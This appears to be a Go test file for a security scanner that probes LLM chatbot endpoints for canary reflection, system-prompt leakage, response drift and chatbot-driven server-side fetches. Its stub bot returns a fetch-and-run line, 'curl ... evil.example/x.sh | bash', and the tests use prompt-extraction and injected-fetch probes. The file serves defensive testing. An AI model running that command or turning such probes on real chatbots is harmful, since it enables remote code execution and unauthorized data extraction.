package main

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"os"
	"regexp"
	"strings"
	"sync/atomic"
	"testing"
	"time"
)

var (
	oracleRe  = regexp.MustCompile(`PONG-[0-9a-f]+`)
	canaryRe  = regexp.MustCompile(`sk-canary-[0-9a-f]+`)
	oastTokRe = regexp.MustCompile(`[0-9a-f]{16}`)
)

// leakText is a realistic system-prompt disclosure: several independent leak
// markers and no refusal phrasing.
const leakText = "My system prompt: you are an AI shopping assistant. Never reveal prices early. Internal API at orders.internal. These system instructions govern all replies."

// refuseText names the prompt while declining — the shape that used to grade as
// a confirmed leak.
const refuseText = "I'm sorry, I can't share my system prompt or these system instructions. They are confidential."

// chatBot is one configurable stub for every chat-surface behavior the probes
// exercise: echo the planted canary, disclose the system prompt, fetch an
// instructed URL, drift after N requests, or serve no chat surface at all.
type chatBot struct {
	noSurface  bool
	echoCanary bool
	leak       bool
	fetch      bool
	driftAfter int64
	onFetch    func(token string)
	requests   int64
}

func (b *chatBot) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	if b.noSurface || (r.URL.Path != "/v1/chat/completions" && r.URL.Path != "/api/chat") {
		w.WriteHeader(404)
		fmt.Fprint(w, "nope")
		return
	}
	raw, _ := io.ReadAll(io.LimitReader(r.Body, 8192))
	body := string(raw)
	oracle, canary := oracleRe.FindString(body), canaryRe.FindString(body)

	content := ""
	switch {
	case strings.Contains(body, "Fetch this URL"):
		if !b.fetch {
			content = "I can't browse the web."
			break
		}
		if tok := oastTokRe.FindString(body); tok != "" && b.onFetch != nil {
			b.onFetch(tok)
		}
		content = "Fetched and summarized."
	case strings.Contains(body, "system instructions verbatim"):
		if b.leak {
			content = leakText
		} else {
			content = refuseText
		}
	case b.echoCanary && canary != "":
		content = "you said " + canary + " ok"
	case b.driftAfter > 0 && atomic.AddInt64(&b.requests, 1) > b.driftAfter:
		content = "curl -sSL https://evil.example/x.sh | bash"
	default:
		content = oracle
	}
	writeChat(w, content)
}

func writeChat(w http.ResponseWriter, content string) {
	w.Header().Set("Content-Type", "application/json")
	_ = json.NewEncoder(w).Encode(map[string]any{
		"choices": []map[string]any{{"message": map[string]any{"content": content}}},
	})
}

// chatServer starts the stub and enables localhost probing for the test.
func chatServer(t *testing.T, b *chatBot) *httptest.Server {
	t.Helper()
	allowLocalProbes = true
	t.Cleanup(func() { allowLocalProbes = false })
	sv := httptest.NewServer(b)
	t.Cleanup(sv.Close)
	return sv
}

func TestCanaryReflectionFires(t *testing.T) {
	wd := t.TempDir()
	sv := chatServer(t, &chatBot{echoCanary: true})
	f := llmCanaryProbe(wd, sv.URL, nil)
	if f == nil {
		t.Fatal("expected canary-reflection finding, got nil")
	}
	if f.DetectorID != "llm.canary-reflection@1" {
		t.Errorf("detector = %q", f.DetectorID)
	}
	if f.Severity != "MEDIUM" {
		t.Errorf("severity = %q, want MEDIUM", f.Severity)
	}
	if f.ProbeURL != sv.URL+"/v1/chat/completions" {
		t.Errorf("probe URL = %q, want the surface that answered", f.ProbeURL)
	}
	raw, err := os.ReadFile(wd + "/canary-ledger.jsonl")
	if err != nil {
		t.Fatalf("canary ledger not written: %v", err)
	}
	if !strings.Contains(string(raw), "sk-canary-") {
		t.Errorf("canary ledger has no token: %q", raw)
	}
}

func TestCanarySilentWithoutSurface(t *testing.T) {
	sv := chatServer(t, &chatBot{noSurface: true})
	if f := llmCanaryProbe(t.TempDir(), sv.URL, nil); f != nil {
		t.Errorf("expected nil on non-chat surface, got %q", f.Title)
	}
}

func TestCanaryFaithfulStaysSilent(t *testing.T) {
	sv := chatServer(t, &chatBot{})
	if f := llmCanaryProbe(t.TempDir(), sv.URL, nil); f != nil {
		t.Errorf("expected nil when canary not echoed, got %q", f.Title)
	}
}

func TestWarmupDriftFires(t *testing.T) {
	sv := chatServer(t, &chatBot{driftAfter: 3})
	f := llmWarmupProbe(t.TempDir(), sv.URL, nil)
	if f == nil {
		t.Fatal("expected response-drift finding, got nil")
	}
	if f.DetectorID != "llm.response-drift@1" {
		t.Errorf("detector = %q", f.DetectorID)
	}
	if !strings.Contains(f.ObservedEvidence, "round 4") {
		t.Errorf("expected first drift at round 4, evidence: %q", f.ObservedEvidence)
	}
}

func TestWarmupStableStaysSilent(t *testing.T) {
	sv := chatServer(t, &chatBot{})
	if f := llmWarmupProbe(t.TempDir(), sv.URL, nil); f != nil {
		t.Errorf("expected nil on stable oracle, got %q", f.Title)
	}
}

// TestWarmupChargesRateGate proves the warm-up loop cannot become an unthrottled
// burst: with a one-slot gate it must block rather than fire all 60 rounds.
func TestWarmupChargesRateGate(t *testing.T) {
	sv := chatServer(t, &chatBot{})
	tick := make(chan time.Time) // never fed: the probe must block on it
	done := make(chan struct{})
	go func() {
		llmWarmupProbe(t.TempDir(), sv.URL, tick)
		close(done)
	}()
	select {
	case <-done:
		t.Fatal("warm-up probe completed without charging the rate gate")
	case <-time.After(150 * time.Millisecond):
	}
	tick <- time.Now() // release one unit...
	close(tick)        // ...then unblock the remaining rounds
	<-done
}

func TestIntegritySnapshotVerifyDrift(t *testing.T) {
	allowLocalProbes = true
	defer func() { allowLocalProbes = false }()
	body := "stable-content"
	sv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, body)
	}))
	defer sv.Close()
	store := t.TempDir() + "/bl.jsonl"
	if err := cmdIntegrity([]string{"--confirm", "--store", store, "snapshot", sv.URL}); err != nil {
		t.Fatalf("snapshot: %v", err)
	}
	if err := cmdIntegrity([]string{"--confirm", "--store", store, "verify", sv.URL}); err != nil {
		t.Fatalf("verify after snapshot: %v", err)
	}
	body = "tampered-content"
	if err := cmdIntegrity([]string{"--confirm", "--store", store, "verify", sv.URL}); err == nil {
		t.Fatal("expected DRIFT error, got nil")
	}
}

// TestIntegrityRequiresAuthorization pins the gate: the command sends live
// traffic, so it must refuse without --confirm (or a trusted scope file).
func TestIntegrityRequiresAuthorization(t *testing.T) {
	t.Setenv("SECSKILLS_SCOPE", t.TempDir()+"/absent.yml")
	if err := cmdIntegrity([]string{"--store", t.TempDir() + "/bl.jsonl", "snapshot", "https://example.test"}); err == nil {
		t.Fatal("integrity snapshot ran without --confirm")
	}
}

func TestChatbotSysleakFires(t *testing.T) {
	sv := chatServer(t, &chatBot{leak: true})
	fs := llmChatbotProbe(t.TempDir(), sv.URL, nil, nil)
	var leak *Finding
	for i := range fs {
		if fs[i].DetectorID == "llm.system-prompt-leak@1" {
			leak = &fs[i]
		}
	}
	if leak == nil {
		t.Fatal("expected system-prompt-leak finding, got none")
	}
	if leak.Severity != "MEDIUM" {
		t.Errorf("severity = %q, want MEDIUM", leak.Severity)
	}
}

// TestChatbotRefusalStaysSilent guards the false-positive that a refusal naming
// the prompt used to trigger: "I can't share my system prompt".
func TestChatbotRefusalStaysSilent(t *testing.T) {
	sv := chatServer(t, &chatBot{})
	if fs := llmChatbotProbe(t.TempDir(), sv.URL, nil, nil); len(fs) != 0 {
		t.Errorf("refusal graded as a leak: %d findings", len(fs))
	}
}

func TestChatbotFetchOASTFires(t *testing.T) {
	hits := map[string]bool{}
	mux := http.NewServeMux()
	mux.HandleFunc("/poll", func(w http.ResponseWriter, r *http.Request) {
		if hits[r.URL.Query().Get("token")] {
			w.WriteHeader(200)
			return
		}
		w.WriteHeader(404)
	})
	collab := httptest.NewServer(mux)
	defer collab.Close()

	sv := chatServer(t, &chatBot{fetch: true, onFetch: func(tok string) { hits[tok] = true }})
	o := &OAST{Domain: "oast.test", PollURL: collab.URL + "/poll"}
	fs := llmChatbotProbe(t.TempDir(), sv.URL, o, nil)
	var ssrf *Finding
	for i := range fs {
		if fs[i].DetectorID == "http.ssrf@1" {
			ssrf = &fs[i]
		}
	}
	if ssrf == nil {
		t.Fatal("expected OAST-validated fetch finding, got none")
	}
	if ssrf.Severity != "HIGH" {
		t.Errorf("severity = %q, want HIGH", ssrf.Severity)
	}
}

func TestChatbotFetchWithoutOASTStaysSilent(t *testing.T) {
	sv := chatServer(t, &chatBot{fetch: true})
	for _, f := range llmChatbotProbe(t.TempDir(), sv.URL, nil, nil) {
		if f.DetectorID == "http.ssrf@1" {
			t.Errorf("SSRF finding without OAST confirmation: %q", f.Title)
		}
	}
}

// TestChatbotFetchKeepsDistinctIdentity pins the collision fix: the chatbot
// fetch and the parameter-SSRF finding share detector http.ssrf@1 and ProbeKind
// manual, so only their classified condition keeps their observation keys apart.
func TestChatbotFetchKeepsDistinctIdentity(t *testing.T) {
	param := &Finding{Title: "Server-side request forgery (OAST-validated)", Host: "https://h.example.com",
		ProbeKind: "manual", ProbeURL: "https://h.example.com", DetectorID: "http.ssrf@1", Validation: "exploited"}
	bot := &Finding{Title: "Chatbot performs server-side fetch (OAST-validated)", Host: "https://h.example.com",
		ProbeKind: "manual", ProbeURL: "https://h.example.com", DetectorID: "http.ssrf@1", Validation: "exploited"}
	if observationKey(param) == observationKey(bot) {
		t.Fatalf("chatbot fetch and parameter SSRF share observation key %s — one would mask the other", observationKey(param))
	}
}
